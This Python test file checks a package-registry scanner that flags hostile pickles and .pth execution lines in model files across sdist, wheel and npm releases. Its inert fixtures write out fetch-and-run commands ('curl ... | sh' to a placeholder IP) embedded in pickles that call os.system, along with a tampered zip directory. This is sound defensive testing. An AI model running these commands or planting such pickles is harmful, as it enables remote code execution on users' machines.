"""FP-MODEL-FILES in the registry scan: a release's model files read for what their pickles would run, in a wheel,
an sdist and an npm tarball, as a project scan reads them (tests/scanner/test_review_model_files.py).

A checkpoint was SC-NESTED-ARCHIVE (WARN) in an npm or sdist release, and nothing in a wheel (a zip in a wheel is
not reported), while a hostile pickle in either went unread. A zip model file larger than the member limit is read
for its pickles as the archive's stream passes (John's decision of Oct 21: a checkpoint of any size is judged). Files
built in the test (tests/_model_files.py), inert.
"""
import io
import resource
import shutil
import tarfile
import time
import unittest
import zipfile

from tests import _model_files as mf
from tests.registry._review_support import issues, scan_npm, scan_sdist, scan_wheel

SETUP = "from setuptools import setup\nsetup(name='x')\n"
WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
NPM = '{"name": "x", "version": "1.0.0", "main": "index.js"}'


def sc(res):
    return sorted((i["file"], i["rule"], i["sev"]) for i in res["issues"]
                  if i["rule"].startswith("SC-") and i["sev"] != "INFO")


class Releases(unittest.TestCase):
    def test_a_checkpoint_is_quiet_everywhere(self):
        pt = mf.state_dict_pt()
        for res in (scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/weights.pt": pt}),
                    scan_wheel({"x/__init__.py": "", "x/weights.pt": pt, **WHEEL_META}),
                    scan_npm({"package.json": NPM, "index.js": "1;\n", "models/w.pt": pt})):
            self.assertEqual(sc(res), [], res["issues"])
            self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_benign_formats(self):
        files = {"setup.py": SETUP, "x/__init__.py": "", "x/m.joblib": mf.sklearn_tree(),
                 "x/m.npz": mf.npz({"a.npy": mf.npy("<f8", bytes(24))}), "x/o.npy": mf.npy_objects([1, "a"]),
                 "x/l.pt": mf.legacy_pt(), "x/last.ckpt": mf.lightning_ckpt()}
        res = scan_sdist(files)
        self.assertEqual(sc(res), [], res["issues"])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_a_hostile_pickle_is_suspicious_in_each_kind(self):
        bad = mf.torch_zip(mf.os_system("curl -s http://192.0.2.1/x | sh"))
        for res in (scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/weights.pt": bad}),
                    scan_wheel({"x/__init__.py": "", "x/weights.pt": bad, **WHEEL_META}),
                    scan_npm({"package.json": NPM, "index.js": "1;\n", "w.pkl": mf.os_system("id")})):
            self.assertIn("SC-PICKLE-CODE", [r for _, r, _ in sc(res)], res["issues"])
            self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_the_packages_own_module(self):
        # listed (INFO), setting no verdict: the module is the release's own code, which the scan reads
        res = scan_wheel({"x/__init__.py": "", "x/model.py": "class Net: pass\n",
                          "x/assets/m.pt": mf.full_model_pt("x.model"), **WHEEL_META})
        self.assertEqual(sc(res), [])
        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-PICKLE-GLOBAL")], [("x/assets/m.pt", "INFO")])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_the_libraries_benign_files_and_an_own_enum(self):
        # the precision review of Oct 21: the libraries' files (tests/fixtures/model_files) and the standard library's
        # data types quiet, in each kind; an enum of the release's own source looked up by a URL: the own module's INFO
        # and the call's MAJOR (the external re-review of Oct 27 dropped the waiver)
        from tests.scanner.test_review_model_precision import fixtures, stdlib_data
        source = mf.fn("x.kinds", "Source")
        enum_pkl = mf.plain_pickle([mf.Reduce(source, ("https://hub.invalid/x",))], 2, {"x.kinds": {"Source": source}})
        data = {f"x/{k}": v for k, v in {**fixtures(), **stdlib_data()}.items()}
        own = {"x/__init__.py": "", "x/kinds.py": "import enum\n\nclass Source(enum.Enum):\n    HUB = 'https://hub.invalid/x'\n",
               "x/assets/enum.pkl": enum_pkl, **data}
        for res in (scan_sdist({"setup.py": SETUP, **own}), scan_wheel({**own, **WHEEL_META}),
                    scan_npm({"package.json": NPM, "index.js": "1;\n", **own})):
            self.assertEqual(sc(res), [("x/assets/enum.pkl", "SC-PICKLE-GLOBAL", "MAJOR")], res["issues"])
            self.assertEqual(sorted((i["file"], i["sev"]) for i in issues(res, "SC-PICKLE-GLOBAL")),
                             [("x/assets/enum.pkl", "INFO"), ("x/assets/enum.pkl", "MAJOR")])

    def test_unreadable_is_incomplete(self):
        res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/m.pkl": mf.os_system("id")[:-2]})
        self.assertIn(("x/m.pkl", "SC-TRUNCATED", "CRITICAL"), sc(res))
        self.assertIn(res["verdict"], ("INCOMPLETE", "SUSPICIOUS"))
        res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/m.pkl.bz2": b"BZh91AY&SY" + bytes(40)})
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])

    def test_a_model_file_past_the_member_limit(self):
        # a zip read for its pickles as the stream passes, in an sdist, a wheel and an npm tarball; a pickle that is
        # not in a zip, by its first bytes: SC-TRUNCATED (INCOMPLETE)
        from unittest import mock
        from lazaret.registry import repo
        big = mf.torch_zip(mf._torch_pickle({}), [("0", bytes(20000))])
        bad = mf.torch_zip(mf.os_system("id"), [("0", bytes(20000))])
        with mock.patch.object(repo, "MAX_MEMBER", 8192):
            for scan_, files in ((scan_sdist, {"setup.py": SETUP, "x/__init__.py": ""}),
                                 (scan_wheel, {"x/__init__.py": "", **WHEEL_META}),
                                 (scan_npm, {"package.json": NPM, "index.js": "1;\n"})):
                res = scan_(dict(files, **{"x/big.pt": big}))
                self.assertEqual(sc(res), [], res["issues"])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])
                res = scan_(dict(files, **{"x/big.pt": bad}))
                self.assertEqual([t for t in sc(res) if t[0] == "x/big.pt"], [("x/big.pt", "SC-PICKLE-CODE", "CRITICAL")])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
            res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/big.pkl": mf.plain_pickle({"w": bytes(20000)}, 2)})
        self.assertEqual([t for t in sc(res) if t[0] == "x/big.pkl"], [("x/big.pkl", "SC-TRUNCATED", "CRITICAL")])
        self.assertEqual(res["verdict"], "INCOMPLETE", res["verdictReason"])

    def test_a_pth_file_past_the_member_limit(self):
        # read in chunks as the stream passes for the lines site.py runs (John's decision of Oct 21), a checkpoint's
        # pickles by the pieces kept: complete, in an sdist, a wheel and an npm tarball
        from unittest import mock
        from lazaret.registry import repo
        late = b"\nimport os; os.system('curl -s http://192.0.2.1/a | sh')\n"
        ok = mf.torch_zip(mf._torch_pickle({}), [("0", bytes(20000))])
        bad = mf.torch_zip(mf._torch_pickle({}), [("0", bytes(20000))], more=[("archive/extra/notes", late)])
        paths = ("./lib\n" * 4000 + "import nspkg_x\n").encode()
        with mock.patch.object(repo, "MAX_MEMBER", 8192):
            for scan_, files in ((scan_sdist, {"setup.py": SETUP, "x/__init__.py": ""}),
                                 (scan_wheel, {"x/__init__.py": "", **WHEEL_META}),
                                 (scan_npm, {"package.json": NPM, "index.js": "1;\n"})):
                res = scan_(dict(files, **{"x/model.pth": ok}))
                self.assertEqual(sc(res), [], res["issues"])
                self.assertEqual(res["verdict"], "OK", res["verdictReason"])
                res = scan_(dict(files, **{"x/model.pth": bad}))
                # (its extra member keeps the archive's warning where the release reports one: not in a wheel)
                self.assertIn(("x/model.pth", "SC-PTH-EXEC", "CRITICAL"), sc(res))
                self.assertLessEqual({t for t in sc(res) if t[0] == "x/model.pth"},
                                     {("x/model.pth", "SC-PTH-EXEC", "CRITICAL"), ("x/model.pth", "SC-NESTED-ARCHIVE", "MINOR")})
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                res = scan_(dict(files, **{"paths.pth": paths}))
                self.assertEqual([t for t in sc(res) if t[0] == "paths.pth"], [("paths.pth", "SC-PTH-EXEC", "MAJOR")])
                self.assertEqual([i["line"] for i in issues(res, "SC-PTH-EXEC")], [4001])

    def test_a_checkpoint_whose_directory_names_bytes_not_kept(self):
        # the stream is read once: a central directory that points at bytes the read did not keep (here: at the
        # storage's, which is not a pickle member's) is SC-TRUNCATED, never quiet
        from unittest import mock
        from lazaret.registry import repo
        big = bytearray(mf.torch_zip(mf.os_system("id"), [("0", bytes(20000))]))
        first = big.index(b"PK\x01\x02")                                   # (data.pkl's)
        storage = big.index(b"archive/data/0")
        big[first + 42:first + 46] = (storage - 30).to_bytes(4, "little")  # data.pkl's entry now names the storage
        with mock.patch.object(repo, "MAX_MEMBER", 8192):
            res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/big.pt": bytes(big)})
        # (and the local headers are walked as a streaming unpacker walks them: data.pkl's own, which no directory
        # entry names now, is read too, its payload found beside the SC-TRUNCATED: the zip reader's views, Oct 21)
        self.assertEqual(res["verdict"], "SUSPICIOUS", (res["verdictReason"], sc(res)))
        self.assertIn(("x/big.pt", "SC-TRUNCATED", "CRITICAL"), sc(res))
        self.assertIn(("x/big.pt", "SC-PICKLE-CODE", "CRITICAL"), sc(res))

    def test_a_200_mb_checkpoint_in_a_release(self):
        # streamed through an sdist's tar.gz and a wheel's zip (deflated), never held whole: quiet when benign,
        # SUSPICIOUS when hostile, in bounded time and memory
        def sdist(parts, name):
            buf = io.BytesIO()
            with tarfile.open(fileobj=buf, mode="w:gz", compresslevel=1) as tf:
                for small, data in (("setup.py", SETUP.encode()), ("x/__init__.py", b"")):
                    info = tarfile.TarInfo("x-1.0/" + small)
                    info.size = len(data)
                    tf.addfile(info, io.BytesIO(data))
                info = tarfile.TarInfo(f"x-1.0/x/{name}")
                info.size = mf.parts_size(parts)
                tf.addfile(info, io.BufferedReader(mf.PartsReader(parts), 1 << 20))
            return buf.getvalue()

        def wheel(parts, name):
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=1) as zf:
                zf.writestr("x/__init__.py", "")
                zf.writestr("x-1.0.dist-info/METADATA", WHEEL_META["x-1.0.dist-info/METADATA"])
                with zf.open(f"x/{name}", "w") as w:
                    shutil.copyfileobj(io.BufferedReader(mf.PartsReader(parts), 1 << 20), w, 1 << 20)
            return buf.getvalue()

        from tests.registry._review_support import scan_bytes
        good = mf.big_torch_zip(mf._torch_pickle({"w": 1}), [100_000_000, 100_000_000])
        bad = mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                               more=[("archive/constants.pkl", mf.os_system("curl -s http://192.0.2.1/a | sh"))])
        late = mf.big_torch_zip(mf._torch_pickle({}), [200_000_000],
                                more=[("archive/extra/notes", b"\nimport os; os.system('id')\n")])
        for make, kw in ((sdist, {"artifact": "sdist", "eco": "pypi"}),
                         (wheel, {"container": "zip", "artifact": "wheel", "eco": "pypi"})):
            for parts, verdict, name, rule in ((good, "OK", "weights.pt", None),
                                               (bad, "SUSPICIOUS", "weights.pt", "SC-PICKLE-CODE"),
                                               (good, "OK", "weights.pth", None),
                                               (late, "SUSPICIOUS", "weights.pth", "SC-PTH-EXEC")):
                data = make(parts, name)
                self.assertLess(len(data), 5_000_000)
                before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
                t = time.monotonic()
                res = scan_bytes(data, **kw)
                took = time.monotonic() - t
                grew = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss - before     # (KiB on Linux)
                self.assertEqual(res["verdict"], verdict, (make.__name__, name, res["verdictReason"], sc(res)))
                self.assertLess(took, 15, took)
                self.assertLess(grew, 150_000, f"{grew} KiB more")
                if rule:
                    self.assertIn((f"x/{name}", rule, "CRITICAL"), sc(res))

    def test_other_nested_archives_are_as_before(self):
        res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "", "x/data.zip": mf.npz({"readme.txt": b"hi"})})
        self.assertEqual([r for _, r, _ in sc(res)], ["SC-NESTED-ARCHIVE"])
        self.assertEqual(len(issues(res, "SC-NESTED-ARCHIVE")), 1)


if __name__ == "__main__":
    unittest.main()
